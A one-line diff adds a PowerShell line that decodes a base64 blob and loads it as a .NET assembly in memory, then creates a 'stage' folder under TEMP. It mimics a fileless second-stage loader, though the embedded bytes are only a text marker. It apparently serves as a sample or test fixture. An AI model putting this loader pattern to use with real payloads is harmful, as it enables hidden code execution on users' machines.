@@ -1,0 +1,1 @@
+$PayloadBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjo4dmFvdGkwbDI0"); $TransferResult = [Reflection.Assembly]::Load($PayloadBytes); $TransferResult.GetTypes().Count; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
